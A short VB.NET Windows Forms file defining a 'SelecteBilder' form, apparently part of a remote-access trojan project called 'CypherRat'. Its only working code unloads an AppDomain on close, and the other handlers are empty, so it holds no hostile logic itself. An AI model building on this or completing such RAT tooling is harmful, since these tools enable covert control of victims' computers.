Imports System.IO
Imports System.Reflection
 Public Class SelecteBilder
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub
    Private Sub SelecteBilder_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If CypherRat.APPDOM IsNot Nothing Then
             AppDomain.Unload(CypherRat.APPDOM)
            CypherRat.APPDOM = Nothing
        End If
    End Sub
     Private Sub SelecteBilder_Load(sender As Object, e As EventArgs) Handles MyBase.Load



    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

    End Sub
End Class